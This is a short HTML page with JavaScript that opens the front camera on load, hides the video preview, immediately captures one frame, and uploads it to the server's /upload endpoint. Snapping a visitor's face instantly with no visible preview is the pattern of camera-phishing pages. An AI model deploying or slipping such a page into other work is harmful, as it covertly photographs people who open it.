<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Photo</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            color: white;
            text-align: center;
        }
        #capture-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        #video {
            display: none; /* Hide video element */
        }
        #capture-canvas {
            display: none; /* Hide canvas element */
        }
        #status {
            color: white;
        }
    </style>
</head>
<body>
    <div id="capture-container">
        <video id="video" autoplay></video>
        <canvas id="capture-canvas"></canvas>
        <p id="status">Capturing photo...</p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const captureContainer = document.getElementById('capture-container');
            const video = document.getElementById('video');
            const canvas = document.getElementById('capture-canvas');
            const context = canvas.getContext('2d');
            const status = document.getElementById('status');

            try {
                // Access the front-facing camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' } // 'user' is the front-facing camera
                });
                video.srcObject = stream;

                video.addEventListener('loadedmetadata', async () => {
                    // Set canvas size based on video size
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Capture the image quickly
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/png');

                    // Send image data to server
                    try {
                        const response = await fetch('/upload', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ image: dataURL })
                        });

                        if (response.ok) {
                            status.textContent = 'Photo uploaded successfully!';
                        } else {
                            status.textContent = 'Failed to upload photo.';
                        }
                    } catch (error) {
                        console.error('Error occurred during upload:', error);
                        status.textContent = 'Failed to upload photo.';
                    }

                    // Hide capture container and stop the video stream
                    captureContainer.style.display = 'none';
                    stream.getTracks().forEach(track => track.stop());
                });

                // Show the capture container
                captureContainer.style.display = 'flex';
            } catch (error) {
                console.error('Camera access denied or not available.', error);
                status.textContent = 'Failed to access camera.';
            }
        });
    </script>
</body>
</html>
